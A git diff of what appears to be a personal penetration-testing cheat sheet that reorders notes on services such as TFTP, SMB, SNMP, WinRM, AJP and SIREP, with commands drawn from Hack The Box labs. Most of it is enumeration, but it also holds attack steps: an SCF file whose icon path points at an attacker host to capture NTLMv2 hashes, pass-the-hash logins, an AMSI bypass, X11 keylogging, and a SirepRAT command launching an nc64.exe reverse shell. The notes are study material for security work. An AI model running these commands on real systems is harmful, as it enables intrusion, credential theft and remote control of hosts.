@@ -331,6 +331,699 @@ PPS:(Port, Protocols & Services)
 								mget * => To download all the files and directories
 								Note:
 									mget means "multiple get" and it's used to download multiple files.
+			TFTP(UDP/69):(Trivial File Transfer Protocol)
+				Understanding TFTP:
+					TFTP is installed by default on:
+						Windows XP
+						Windows Sever 2003
+				Enumeration:
+					Connecting to a TFTP Server:
+						TFTP:(Binary)
+							Basics:
+								Installation:
+									apt install atftpd
+									chown nobody:nogroup /tftp
+							Usage:
+								tftp -i 10.0.0.1 PUT file.exe => transfer file from windows to kali
+								Flags:
+									-i <ip>
+								Meta-Commands:
+									send => Send single file
+									put => Send one file.
+									mput => Send multiple files.
+									mget => Get multiple files.
+									get => Get file from the remote computer.
+									ls => list 
+									mget * => Download everything
+									binary => Switches to binary transfer mode.
+									ascii => Switch to ASCII transfer mode
+					Using Nmap:
+						nmap -sU -p 69 --script tftp-enum.nse $ip
+				Exploitation:
+					Vulnerable Versions => 1.3, 1.4, 1.9, 2.1, and a few more
+			Finger:(79)
+				Understanding Finger:
+					Finger protocol is used in Solaris OS.
+				Enumeration:
+					finger-user-enum.pl:(https://github.com/pentestmonkey/finger-user-enum)
+						Basics:
+							It can used to enumerate what users are currently logged in.
+						Usage:
+							./finger-user-enum.pl -U users.txt -t <ip>
+							Flags:
+								-t => ip
+								-U => users.txt
+									User Wordlist:
+										/usr/share/seclists/Usernames/Names/names.txt
+										/usr/share/metasploit-framework/data/wordlists/unix_users.txt
+				Used in HTB::Sunday
+			Kerberos(88):
+				Read Windows Internals Sheet
+			RPCBIND(111):(aka Portmapper)
+				Basics:
+					Read RPC Section of Windows Internals Sheet
+					Note:
+						RPCBind is directly not a part of windows, but Microsoft's Endpoint mapper is based on RPCBind. So, i have decided to include it under "RPC" Section.
+				Enumeration/Exploitation:
+					Read AD Exploitation Sheet
+			Ident:(113)
+				Understanding Ident:
+				Enumeration:
+					We use this port to enumerate users. We basically pass port_number to it and it tells us which user is running that service
+					ident-user-enum:(apt install ident-user-enum)
+						Basics:
+						Usage:
+							ident-user-enum 192.168.1.100 22 113 139 445
+							ident-user-enum ip <port1> <port2> <port3> <port4>
+								port_n => the ports we got in nmap results
+			NTP(123):(Network Time Protocol)
+				Understanding NTP:
+				Enumeration:
+			MSRPC/RPC Endpoint Mapper:(135/593)
+				Basics:
+					Read Windows Internals Sheet
+				Enumeration/Exploitation:
+					Read AD Exploitation Sheet
+			NetBIOS(TCP-137/138/139,UDP-137/138/139):(Network Basic Input Output System)
+				Basics:
+					Read Windows Internals Sheet
+				NetBIOS Service-based Exploitation/Enumeration:(3)
+					A. NBNS:(aka NetBIOS-NS)(TCP/UDP 137)
+						Basics:
+							NBNS can be used to access NBT(NetBIOS Name Table). This can be used to enumerate system details such as hostname, domain information, etc.
+						Enumeration:
+							Using Windows:
+								NBTstat:
+									Basics:
+										Its used to query NetBT stats, as well as NetBIOS Name Table and NetBIOS Name Cache.
+									Usage:
+										nbtstat -A <ip> => Prints NBT table for remote host
+											Understanding Output:
+												<computer_name> <identifier> <> <>
+										Flags:
+											-a <hostname> => Prints NBT table for remote host
+											-A <ip> => Prints NBT table for remote host
+											-c => Display NBNS's cache
+											-n => Display local NetBIOS table
+											-r => Show NetBIOS name resolution stats
+											-R => 
+											-S => 
+											-s => 
+											-RR => 
+							Using Linux:
+								NBTScan:
+									Basics:
+										Advantages:
+											NBTScan, unlike NBTStat can scan multiple addresses.
+									Usage:
+										Passing Host(s):
+											nbtscan <host_ip> => Single Host
+											nbtscan 192.169.0.11/24 => Subnet
+										Flags:
+								NMBLookup:
+									Basics:
+									Usage:
+										Flags:
+						Exploitation:
+					B. NetBIOS-DGM:(TCP/UDP 138)
+						Basics:
+						Enumeration:
+						Exploitation:
+					C. NetBIOS-SSN:(TCP/UDP 139)
+						Basics:
+							It can be used to enumerate user details, shared folders, domain information, etc.
+						Enumeration:
+							Windows:
+								Net.exe:("net use" specifically)
+									Basics:
+									Usage:
+										net use \\ip\share_name /user
+										Flags:
+						Exploitation:
+							If we have creds:(Privileged User)
+								We can upload and download files, schedule and run arbitary commands, access and modify registry and read SAM.
+							If we dont have creds:
+								Bruteforcing:
+			SMB(137/138/139/445):(Server Message Block)
+				Basics:
+					Read Windows Internals Sheet.
+				Enumeration:
+					Methodology:
+						1. Use SMBMAP to discover which shares have R/W permission and Then, use SMBCLIENT to connect to the shares.
+						2. Mount SMB shares.
+					Mouting SMB shares:
+						Basics:
+							It means that we connect to the available shares. This attaches share like a directory.
+							When to mount:
+								When we have a lot of files/directories inside a share
+						Mount:(Binary)
+							Mounting Linux Shares:
+								mount //ip/sharename /mnt/abcd
+							Mounting Windows Shares:
+								mount -t cifs //ip/sharename /mnt/abcd => shares which are accessible by anonymous user
+								mount -t cifs -o 'username=abcd%pass' //ip/sharename /mnt => shares which require authenciation
+								mount -t cifs -o username=user1234,password=pass1234 //ip/sharename /mnt => shares which require authenciation
+								Flags:
+									-t cifs => windows protcol for mounting shares 
+							Note:
+								Read Linux Shell Commands Sheet to read more.
+					Unmounting SMB shares:
+						umount:
+							umount /mnt/abcd
+							Note:
+								Spelling is "umount" not "unmount".
+							Note:
+								Read Linux Shell Commands Sheet to read about umount.						
+					Tools:
+						SMBMap:
+							Basics:
+								It show SMB shares along with permissions.
+								Note:
+									SMBMap cannot take IPv6 as <ip>
+							Usage:
+								smbmap -H ip => show shares along with permissions
+								smbmap -u anonymous -H ip => anonymous login
+								smbmap -H ip -u null => anonymous login
+								smbmap -H ip -u null -p null => anonymous login
+								smbmap -u user -p pass ip -R sharename => see files
+								smbmap -u user -p pass ip -R sharename -A file => get "file"
+								smbmap -u user -p pass/hash -H ip -d domain
+								Flags:
+									-H =>  
+									-u => 
+									-p => 
+									-R => 
+									-d => 
+								Note:
+									Sometimes, smbmap dont work, in that case, use smbclient.
+						SMBClient:
+							Basics:
+								Its used for downloading/uploading files
+							Usage:
+								List shares:
+									smbclient -L ip => anonymous login
+									smbclient -L ip -u "" => anonymous login
+									smbclient -L ip -u '' => anonymous login
+									smbclient -L //ip/
+									smbclient -L <ip> -U 'user_name%password' => authenciated login
+									smbclient -U username //ip/sharename 'pass' => to get authenciated smb shell
+									smbclient //ip/sharename => List files in a share
+								Flags:
+									-L =>
+									-U =>
+								Meta-Commands:
+									put file.exe => To upload a file
+									get file.exe => To download a file
+									To download all the files and directories in a share:
+										smb> recurse on
+										smb> prompt off
+										smb> mget *
+										Note:
+											mget means "multiple get" and is used to download multiple files
+								Note:
+									//ip/ = ////ip// = ip
+						PTH-SMBClient:
+							Basics:
+								It's similiar to SMBClient, but accepts hash instead of password.
+							Usage:
+								pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
+								pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
+								Flags:
+									-U => 
+						SMBCacls:
+							Basics:
+								smbcacls is used to show info related to a share such as owner of share and who can write to share and a folders in it
+							Usage:
+								smbcacls -N //ip/share_name /folder_name => show permissions
+								FLags:
+									-N => 
+								Automating it:
+									mount the share
+									cd /mnt
+									for i in  $(ls); do echo $i; smbcacls -N  //ip/share_name $i; done;
+				Exploitation:
+					SCF File Attack:(used in HTB::Sizzle)
+						Basics:
+							We need write access in share for this attack
+							We will upload a SCF file to the share and run responder. As soon as a user will open the share, the scf file get executed automatically and user will be forced to authenciate with us, thus giving ntlmV2 hash which the responder will capture.
+						Exploitation:
+							Creating a SCF file:(Shell Command File)
+								[Shell]
+								Command=2
+								IconFile=\\attackers_ip\tools\nc.ico
+								[Taskbar]
+								Command=ToggleDesktop
+							Using responder:
+								responder -I tun0
+								Note:
+									To read more about Responder tool => Read AD Exploitation Sheet
+							Cracking hash:
+								hashcat -m 5600 file.hash /usr/share/wordlists/rockyou.txt --force
+			SNMP(UDP/161):(Simple Network Management Protocol)
+				Understanding SNMP:
+					Basics:
+						Its used for collecting & exchanging management information between network devices, such as, routers, switches, servers, printers, etc in order to monitor the network devices.
+						Versions:
+							SNMPv1:
+								It uses community strings for authentication.
+								It uses UDP only.
+							SNMPv2:(aka SNMPv2c)
+								It uses community strings for authentication.
+								It uses UDP but can be configured to use TCP.
+							SNMPv3:
+								It uses MD5 or SHA hash for authentication and DES-56 for privacy.
+								It uses TCP only.
+						Components:(4)
+							A. Managed Devices:
+								Basics:
+									Managed Device refers to a network nodes, such as printers, routers, switches, etc that have SNMP enabled for either unidirectional(read) or bidirectional(read/write) communication.
+									These devices exchange node-specific information with NMSs.
+							B. SNMP Agent:
+								Basics:
+									Its a program installed on a managed device responsible for collecting management information, converting that management information into SNMP-compatible format and making it available to SNMP Manager.
+							C. NMS:(Network Management System)(aka Network Management Station)(aka SNMP Manager)
+								Basics:
+									NMS is a centralizied system responsible for managing & communicating with SNMP Agents. One or more NMS may exist in a network.
+									Note:
+										SNMP Manager is a computer thats used to run one or more NMSs in a network.
+								Functions:
+									Query SNMP agents
+									Set variables in agents
+							D. 	MIB:(Management Information Base)(aka MIB Tree)
+								Basics:
+									MIB is a virtual hierarchical tree-like database hosted by every SNMP Agent and is shared with SNMP Manager.
+									MIB is SNMP Manager uses this db to request SNMP Agent for specifc information.
+								Structure:
+									Objects & OID(Object ID):
+										Basics:
+											MIB contains "Managed Objects" having unique OID.
+										Types:(2)
+											1. Scalar OID:
+												Scalar OID is given to Scalar Objects. Scalar Object define a single object instance, for example device’s vendor name, etc.
+											2. Tabular OID:
+												Tabular OID is given to Tabular Objects. Tabular object defines multiple related object instance that are grouped together in MIB tables, for example, CPU utilization.
+						Community Strings:(aka SNMP String)
+							Basics:
+								Its used by a device for accessing MIB data from other managed devices and is only available in SNMPv1 and SNMPv2.
+							Types:(3)
+								A. Read-Only:
+									Basics:
+										This string allows access to MIB objects on a read-only basis.
+									Default Value => "Public"
+								B. Read-Write:
+									Basics:
+										This string allows access to MIB objects on a read-write basis.
+									Default Value => "Private"
+								C. SNMP Trap:(SNMPv2 Only)
+									Basics:
+					SNMP Commands:
+						GET:
+							GET is a request sent by SNMP Manager to Managed Device to retrive one or more objects.
+						GET NEXT:
+							GET NEXT is a request sent by SNMP Manager to Managed Device to retrive value of the next OID in MIB.
+						GET BULK:
+							GET BULK is used to retrive a lot of data from large MIB Trees.
+						SET:
+							SET is used by Manager to modify or assign value to Managed device.
+						TRAPS:
+							TRAPS is used by Agents by signal the SNMP Manager in case of some event.
+						INFORM:
+							INFORM is used by Agents 
+						RESPONSE:
+							RESPONSE is used by Manager in response to TRAPS commands to provide signal of action to Agents.
+				Enumeration:
+					Bruteforcing Communities:
+						OneSixtyOne:
+							Basics:
+								Its faster than hydra.
+							Usage:
+								onesixtyone -c wordlist.txt <ip>
+								Flags:
+									-c => 
+						Hydra:
+							hydra -P wordlist.txt <ip> snmp
+						Wordlists:
+							/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
+							/usr/share/seclists/Discovery/SNMP/snmp_onesixtyone.txt
+					SNMPWalk:
+						Basics:
+							SNMPWalk is a tool used to query MIB values to extract information about managed devices.
+						Usage:
+							snmpwalk -c <community string> -t 10 -v<version_number> <ip> => it will give an OID number
+								if output is "NO RESPONSE" => the given string is wrong
+							snmpwalk -c public -v<version> <ip> OID_number => enumerate users
+							Flags:
+								-c <string> => community string
+								-v => SNMP version
+								-t => 
+					SNMP-Check:
+						Basics:
+							It shows Output in a better way than snmpwalk
+						Usage:
+							snmp-check -c public <ip>
+							Flags:
+								-c => 
+						Note:
+							"snmp-check" and "snmpcheck" are completely different programs and snmpcheck dont work properly, but snmp-check works properly.
+			IRC(194/6697/6660-7000/8067):(Internet Relay Chat)
+				Understanding IRC:
+				Enumeration:
+					Connecting to IRC:
+				Exploitation:
+					unreal ircd 3.2.8.1:(HTB::irked)
+						https://github.com/MrMafiaP/PwnHouse/tree/master/CVE-2010-2075	
+			RTSP(554/8554):(Real Time Streaming Protocol)
+				Understanding RTSP:
+				Enumeration:
+			Rsync:(873)
+				Understanding Rsync:
+					Its like a file sharing service
+				Enumeration:
+					Netcat:
+						nc -nv <ip> 873
+							Meta-commands:
+								#list => list shares
+
+								Note:
+									"#" is a part of command
+					Rsync:(Binary)
+						Basics:
+							Rsync is used to connect to the shares.
+						Usage:
+							rsync -av --list-only rsync://ip/share_name => lists files
+							rsync -av --list-only rsync://ip/share_name ./rsyncfiles => mounting the rsync share
+							rsync -a --relativ => to upload the files 
+							Flags:
+								-a => 
+								-v => 
+								--list-only => 
+								--relativ => 
+			SOCKS(1080):(Socket Secure)
+				Understanding SOCKS:
+					SOCKS Protocol:
+						Basics:
+							SOCKS is a layer 5(Session layer of OSI model) proxying internet protocol that creates a TCP connection to a server on behalf of client, and then exchange network packets between the client and server. In other words, it creates a tunnel over the protocol. However, SOCKS cannot be used to tunnel protocols which operate below layer 5 of OSI model, thus can only be used for protocols like HTTP, HTTPS, POP3, SMTP and FTP, etc.
+							Ports:
+								TCP/1080
+							Versions:
+								SOCKs4:
+								SOCKs4a:
+									Basics:
+										Its an extension of SOCKs4.
+									Advatanges:
+										1. Allows usage of domainnames instead of IP
+										2. 
+								SOCKs5:
+									Basics:
+									Advatanges:
+										1. Encryption:
+											SOCKs5 use SSH encrypted tunnel.
+										2. Authentication:
+											SOCKs5 support authentication.
+										3. IPv6 Suppot:
+										4. UDP Proxies:
+											SOCKs5 support UDP proxies.
+					Working:
+						SOCKS works in two steps:
+							1. SOCKS is a tunneling protocol:
+								SOCKS create a tunnel by setting up SOCKS server.
+							2. SOCKS is a proxying protocol:(optional)
+								SOCKS uses that tunnel's end-point as a proxy.
+						Example:
+							1. Setting up the tunnel:
+								ssh -NfD 9050 root@10.0.0.1  => This set a tunnel from my_box:9050 to 10.0.0.1 This wont give any shell(bcoz of a flag we used)
+							2. Using tunnel as a proxy:
+								Proxychains:
+									Edit proxychains:
+										127.0.0.1 9050 (that is our end of tunnel)
+									proxychains firefox
+					SOCKS Proxy:
+						Advantages:
+							Firewall
+						Disadvantages:
+							HTTP proxy handle HTTP requests better than SOCKS proxy
+				Creating SOCKS Proxy:
+					https://github.com/Bonveio/socks5-debian
+					https://www.hackingarticles.in/penetration-testing-lab-setup-microsocks/
+					Shadowsocks
+				Enumeration:
+				Exploitation:
+			Node-Red:(1880)
+				Understanding Node-Red:
+					NodeRed is a browser based editor to make flows for IoT devices and other technology to talk together	
+				Used in HTP::Frolic,HTB::Reddish
+			NFS(2049):(Network File Server)
+				Understanding NFS:
+				Enumeration:
+					Nmap:
+						nmap -p 111 --script nfs* ip => it will run all scripts related to nfs
+					Showmount:
+						Basics:
+						Usage:
+							showmount -e <IP> => show mountable folders
+							Flags:
+								-e => 
+					Mounting Shared Folders:
+						Mount:(Binary)
+							mount -t nfs <ip>:/<remote_folder> <local_folder> -o nolock => for win/lin
+							Note:
+								Read Linux Shell Commands Sheet to read more.
+				Exploitation:
+					If NFS is not configured correctly, users can upload arbitrary files (such as SSH keys) and gain access on the system.
+			Docker:(2375/2376)
+				Understanding Docker:
+				Enumeration:
+			ISCSI(3260):(Internet Small Computer Systems Interface)
+				Understanding ISCSI:
+				Enumeration:
+					Nmap:
+						nmap -sV --script=iscsi-info -p 3260 ip
+			SAPRouter:(3299)
+				Understanding SAPRouter:
+				Enumeration:
+			RDP(3389):(Remote Desktop Protocol)
+				Understanding RDP:
+				Connecting to RDP:
+					Rdesktop:
+						Basics:
+						Usage:
+							rdesktop <ip> -g 1900x600
+							Flags:
+								-g => 
+						Note:
+							sometimes, it causes issues, in that case use another tool
+					xFreeRDP:
+						Basics:
+						Usage:
+							xfreerdp /v:ip:port /u:username /p:password
+							Flags:
+								/v:<ip:port> => IP
+								/u:<user_name> or <domain_name>/<user_name> or <user_name>@<domain_name>
+								/d:<domain_name>
+								/p:<password>
+								/pth:<hash_for_pth>
+			SVN(3690):(Subversion)
+				Understanding Subversion:
+				Enumeration:
+			WS-Discovery(3702):(Web Services Discovery Protocol)
+				Understanding WS-Discovery:
+				Enumeration:
+			EPMD(4369):(Erlang Port Mapper Daemon)
+				Understanding EPMD:
+				Enumeration:
+			mDNS(5353):(Multicast DNS)
+				Understanding mDNS:
+				Enumeration:
+				Exploitation:
+			LLMNR:(5355)
+				Basics:
+					Read Windows Internals Sheet
+				Enumeration/Exploitation:
+					Read NTLM Attacks Section of AD Exploitation Sheet
+			ADB(5555):(Android Debug Bridge)
+				Understanding ADB:
+				Enumeration:
+			Kibana:(5601)
+				Understanding Kibana:
+				Enumeration:
+			VNC(5800/5801/5900.5901):(Virtual Network Computing)
+				Understanding VNC:
+					Its like RDP
+					VNC Key Authentication:
+				Enumeration:
+					Connecting to it:
+						VNCViewer:
+							Basics:
+							Usage:
+								vncviewer -passwd pass.txt <ip:port>
+								Flags:
+									-passwd => 
+				Exploitation:
+					Decrypting VNC password:
+						Read Password Cracking And Cryptography Sheet
+			WinRM(5985/5986):(Windows Remote Management)
+				Basics:
+					Read Windows Internals Sheet
+				Connecting to Winrm:
+					Evil-WinRM:(gem install evil-winrm)
+						Basics:
+						Usage:
+							evil-winrm -u user -p 'pass' -i ip -p port
+							evil-winrm -u user -H nt_hash -i ip -s /scripts => /scripts folder will contain ps1 scripts and we can directly import them
+							evil-winrm -u user -H nt_hash -i ip
+							Meta-Commands:
+								menu => show commands and modules of any loaded powershell scripts
+								Dll-Loader => 
+								Donut-Loader => 
+								Invoke-CommandAs => 
+								Invoke-ScheduledTask => 
+								Invoke-binary file.exe => 
+								Bypass-4MSI => bypasses AMSI
+									AMSI blocks binary execution
+								.ps1 Meta Commands:
+									Module names of the scripts we load in memory
+							File Transfers:
+								-s flag = .ps1 scripts
+								Inoke-Binary
+								upload local_filename destination_filename => upload file to victim
+									local files can be auto-completed using tab key. It is not needed to put a remote_path if the local file is in the same directory from which evil-winrm is invoked.
+								download remote_filename destination_filename => download from victim to us
+									it is not needed to set local_path if the remote file is in the current directory.
+							Flags:
+								-i =>
+								-u =>
+								-p =>
+								-H =>
+								-s =>
+					Crackmapexec:
+						crackmapexec winrm ip -u 'user' -p 'pass' -x command 
+			X11(6000):(aka X Window System)
+				Understanding X11:
+					Like RDP
+				Enumeration:
+					Finding info like screen size, window id
+					Connecting to it:
+						xrdp:(apt-get install x11-utils xutils-dev imagemagick libxext-dev xspy)
+							Basics:
+							Usage:
+								xrdp <ip>
+								Flags:
+					xWinInfo:
+						Basics:
+						Usage:
+							xwininfo -root -display <ip>
+							Flags:
+								-root => 
+								-display => 
+				Live Streaming:
+					Its different than connecting to it as here, we just see whats going on the screen.
+					xwatchwin:
+						Basics:
+							Installation:
+								wget http://www.ibiblio.org/pub/X11/contrib/utilities/xwatchwin.tar.gz
+								tar zxvf xwatchwin.tar.gz
+								cd xwatchwin/
+								xmkmf && make && make install
+						Usage:
+							xwatchwin <ip> -w <window_id>
+							Flags:
+								-w => 
+									window_id can be found by using xwininfo
+				KeyLogging:
+					Xspy:
+						Basics:
+						Usage:
+							xspy <ip>
+							Flags:
+			BitTorrent:(UDP/6881)
+				Understanding BitTorrent:
+					Basics:
+						Ports:
+							UDP/6881
+			AJP(8009):(Apache JServ Protocol)
+				Understanding AJP:
+					Its an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat.
+				Enumeration:
+					Nmap:
+						nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>
+				Exploitation:
+					CVE-2020-1938:(aka Ghostcat)
+						LFI vulnerability
+						Vulnerable versions:
+							Apache Tomcat 9	=> 9.0.30 and below
+							Apache Tomcat 8	=> 8.5.50 and below
+							Apache Tomcat 7	=> 7.0.99 and below
+						https://github.com/00theway/Ghostcat-CNVD-2020-10487:
+							python3 ajpShooter.py http://10.10.10.78:8080 8009 /WEB-INF/web.xml read
+			Splunk:(8089)
+				Understanding Splunk:
+				Enumeration:
+				Exploitation:
+			HTTP/HTTPS:(80/81/443/8080/8443)
+				Read WebApp Pentesting For CTF Sheet
+			dRuby:(8787)
+				Understanding dRuby:
+				Exploitation:
+					dRuby RMI Server 1.8 Exploitation:(CVE-2011-5330)
+						Metasploit:
+							exploit/linux/misc/drb_remote_codeexec
+						Manual:
+							Not yet found on google.
+							We can edit the msf exploit and run it manually => accepted in OSCP
+			ElasticSearch:(9200)
+				Understanding ElasticSearch:
+				Enumeration:
+			NDMP(10000):(Network Data Management Protocol)
+				Understanding NDMP:
+				Enumeration:
+			MemCached:(11211)
+				Understanding MemCached:
+					Memcached is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read.
+				Enumeration:(sudo apt install libmemcached-tools)
+					Nmap:
+						nmap -n -sV --script memcached-info -p 11211
+					MemcStat:
+						Basics:
+						Usage:
+							memcstat --servers=ip => Get stats
+							Flags:
+								--servers => 
+					MemcDump:
+						Basics:
+						Usage:
+							memcdump --servers=ip => Get all items
+							Flags:
+								--servers => 
+					MemcCat:
+						Basics:
+						Usage:
+							memccat --servers=ip <item1> <item2> <item3> => Get info inside the items
+							Flags:
+								--servers => 
+			SIREP:(29817/29819/29820)
+				Understanding SIREP:
+					Windows IOT
+				Exploitation:
+					https://www.woprsummit.org/slides-archive/SirepRAT_RCEasSYSTEMonWindowsIoTCore-WOPRSummit.pdf
+					SirepRAT:(https://github.com/SafeBreach-Labs/SirepRAT)
+						Basics:
+						Usage:
+							./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args "/c //10.10.14.7/abcd/nc64.exe -e cmd.exe 10.10.14.7 443"
+							Flags:
+								--return_output => 
+								--as_logged_on_user => 
+								--cmd => 
+								--args => 
+				Used in HTB::omni
+			BACNet(47808):(Building Automation and Control Network)
+				Understanding BACNet:
+				Enumeration:
+			Hadoop:(50030/50060/50070/50075/50090)
+				Understanding Hadoop:
+				Enumeration:
+		Directory PPS:(aka Directory Information Services)(aka Name Services)
+			Note:
+				"Directory" here do not refer to AD.
 			DNS(53):(Domain Name System)(aka DNS System)
 				Understanding DNS:
 					Basics:
@@ -802,701 +1495,11 @@ PPS:(Port, Protocols & Services)
 											mx
 											ns
 									-port=<value> => DNS port(default value => 53)
-			TFTP(UDP/69):(Trivial File Transfer Protocol)
-				Understanding TFTP:
-					TFTP is installed by default on:
-						Windows XP
-						Windows Sever 2003
-				Enumeration:
-					Connecting to a TFTP Server:
-						TFTP:(Binary)
-							Basics:
-								Installation:
-									apt install atftpd
-									chown nobody:nogroup /tftp
-							Usage:
-								tftp -i 10.0.0.1 PUT file.exe => transfer file from windows to kali
-								Flags:
-									-i <ip>
-								Meta-Commands:
-									send => Send single file
-									put => Send one file.
-									mput => Send multiple files.
-									mget => Get multiple files.
-									get => Get file from the remote computer.
-									ls => list 
-									mget * => Download everything
-									binary => Switches to binary transfer mode.
-									ascii => Switch to ASCII transfer mode
-					Using Nmap:
-						nmap -sU -p 69 --script tftp-enum.nse $ip
-				Exploitation:
-					Vulnerable Versions => 1.3, 1.4, 1.9, 2.1, and a few more
-			Finger:(79)
-				Understanding Finger:
-					Finger protocol is used in Solaris OS.
-				Enumeration:
-					finger-user-enum.pl:(https://github.com/pentestmonkey/finger-user-enum)
-						Basics:
-							It can used to enumerate what users are currently logged in.
-						Usage:
-							./finger-user-enum.pl -U users.txt -t <ip>
-							Flags:
-								-t => ip
-								-U => users.txt
-									User Wordlist:
-										/usr/share/seclists/Usernames/Names/names.txt
-										/usr/share/metasploit-framework/data/wordlists/unix_users.txt
-				Used in HTB::Sunday
-			Kerberos(88):
-				Read Windows Internals Sheet
-			RPCBIND(111):(aka Portmapper)
-				Basics:
-					Read RPC Section of Windows Internals Sheet
-					Note:
-						RPCBind is directly not a part of windows, but Microsoft's Endpoint mapper is based on RPCBind. So, i have decided to include it under "RPC" Section.
-				Enumeration/Exploitation:
-					Read AD Exploitation Sheet
-			Ident:(113)
-				Understanding Ident:
-				Enumeration:
-					We use this port to enumerate users. We basically pass port_number to it and it tells us which user is running that service
-					ident-user-enum:(apt install ident-user-enum)
-						Basics:
-						Usage:
-							ident-user-enum 192.168.1.100 22 113 139 445
-							ident-user-enum ip <port1> <port2> <port3> <port4>
-								port_n => the ports we got in nmap results
-			NTP(123):(Network Time Protocol)
-				Understanding NTP:
-				Enumeration:
-			MSRPC/RPC Endpoint Mapper:(135/593)
-				Basics:
-					Read Windows Internals Sheet
-				Enumeration/Exploitation:
-					Read AD Exploitation Sheet
-			NetBIOS(TCP-137/138/139,UDP-137/138/139):(Network Basic Input Output System)
-				Basics:
-					Read Windows Internals Sheet
-				NetBIOS Service-based Exploitation/Enumeration:(3)
-					A. NBNS:(aka NetBIOS-NS)(TCP/UDP 137)
-						Basics:
-							NBNS can be used to access NBT(NetBIOS Name Table). This can be used to enumerate system details such as hostname, domain information, etc.
-						Enumeration:
-							Using Windows:
-								NBTstat:
-									Basics:
-										Its used to query NetBT stats, as well as NetBIOS Name Table and NetBIOS Name Cache.
-									Usage:
-										nbtstat -A <ip> => Prints NBT table for remote host
-											Understanding Output:
-												<computer_name> <identifier> <> <>
-										Flags:
-											-a <hostname> => Prints NBT table for remote host
-											-A <ip> => Prints NBT table for remote host
-											-c => Display NBNS's cache
-											-n => Display local NetBIOS table
-											-r => Show NetBIOS name resolution stats
-											-R => 
-											-S => 
-											-s => 
-											-RR => 
-							Using Linux:
-								NBTScan:
-									Basics:
-										Advantages:
-											NBTScan, unlike NBTStat can scan multiple addresses.
-									Usage:
-										Passing Host(s):
-											nbtscan <host_ip> => Single Host
-											nbtscan 192.169.0.11/24 => Subnet
-										Flags:
-								NMBLookup:
-									Basics:
-									Usage:
-										Flags:
-						Exploitation:
-					B. NetBIOS-DGM:(TCP/UDP 138)
-						Basics:
-						Enumeration:
-						Exploitation:
-					C. NetBIOS-SSN:(TCP/UDP 139)
-						Basics:
-							It can be used to enumerate user details, shared folders, domain information, etc.
-						Enumeration:
-							Windows:
-								Net.exe:("net use" specifically)
-									Basics:
-									Usage:
-										net use \\ip\share_name /user
-										Flags:
-						Exploitation:
-							If we have creds:(Privileged User)
-								We can upload and download files, schedule and run arbitary commands, access and modify registry and read SAM.
-							If we dont have creds:
-								Bruteforcing:
-			SMB(137/138/139/445):(Server Message Block)
-				Basics:
-					Read Windows Internals Sheet.
-				Enumeration:
-					Methodology:
-						1. Use SMBMAP to discover which shares have R/W permission and Then, use SMBCLIENT to connect to the shares.
-						2. Mount SMB shares.
-					Mouting SMB shares:
-						Basics:
-							It means that we connect to the available shares. This attaches share like a directory.
-							When to mount:
-								When we have a lot of files/directories inside a share
-						Mount:(Binary)
-							Mounting Linux Shares:
-								mount //ip/sharename /mnt/abcd
-							Mounting Windows Shares:
-								mount -t cifs //ip/sharename /mnt/abcd => shares which are accessible by anonymous user
-								mount -t cifs -o 'username=abcd%pass' //ip/sharename /mnt => shares which require authenciation
-								mount -t cifs -o username=user1234,password=pass1234 //ip/sharename /mnt => shares which require authenciation
-								Flags:
-									-t cifs => windows protcol for mounting shares 
-							Note:
-								Read Linux Shell Commands Sheet to read more.
-					Unmounting SMB shares:
-						umount:
-							umount /mnt/abcd
-							Note:
-								Spelling is "umount" not "unmount".
-							Note:
-								Read Linux Shell Commands Sheet to read about umount.						
-					Tools:
-						SMBMap:
-							Basics:
-								It show SMB shares along with permissions.
-								Note:
-									SMBMap cannot take IPv6 as <ip>
-							Usage:
-								smbmap -H ip => show shares along with permissions
-								smbmap -u anonymous -H ip => anonymous login
-								smbmap -H ip -u null => anonymous login
-								smbmap -H ip -u null -p null => anonymous login
-								smbmap -u user -p pass ip -R sharename => see files
-								smbmap -u user -p pass ip -R sharename -A file => get "file"
-								smbmap -u user -p pass/hash -H ip -d domain
-								Flags:
-									-H =>  
-									-u => 
-									-p => 
-									-R => 
-									-d => 
-								Note:
-									Sometimes, smbmap dont work, in that case, use smbclient.
-						SMBClient:
-							Basics:
-								Its used for downloading/uploading files
-							Usage:
-								List shares:
-									smbclient -L ip => anonymous login
-									smbclient -L ip -u "" => anonymous login
-									smbclient -L ip -u '' => anonymous login
-									smbclient -L //ip/
-									smbclient -L <ip> -U 'user_name%password' => authenciated login
-									smbclient -U username //ip/sharename 'pass' => to get authenciated smb shell
-									smbclient //ip/sharename => List files in a share
-								Flags:
-									-L =>
-									-U =>
-								Meta-Commands:
-									put file.exe => To upload a file
-									get file.exe => To download a file
-									To download all the files and directories in a share:
-										smb> recurse on
-										smb> prompt off
-										smb> mget *
-										Note:
-											mget means "multiple get" and is used to download multiple files
-								Note:
-									//ip/ = ////ip// = ip
-						PTH-SMBClient:
-							Basics:
-								It's similiar to SMBClient, but accepts hash instead of password.
-							Usage:
-								pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
-								pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/C$
-								Flags:
-									-U => 
-						SMBCacls:
-							Basics:
-								smbcacls is used to show info related to a share such as owner of share and who can write to share and a folders in it
-							Usage:
-								smbcacls -N //ip/share_name /folder_name => show permissions
-								FLags:
-									-N => 
-								Automating it:
-									mount the share
-									cd /mnt
-									for i in  $(ls); do echo $i; smbcacls -N  //ip/share_name $i; done;
-				Exploitation:
-					SCF File Attack:(used in HTB::Sizzle)
-						Basics:
-							We need write access in share for this attack
-							We will upload a SCF file to the share and run responder. As soon as a user will open the share, the scf file get executed automatically and user will be forced to authenciate with us, thus giving ntlmV2 hash which the responder will capture.
-						Exploitation:
-							Creating a SCF file:(Shell Command File)
-								[Shell]
-								Command=2
-								IconFile=\\attackers_ip\tools\nc.ico
-								[Taskbar]
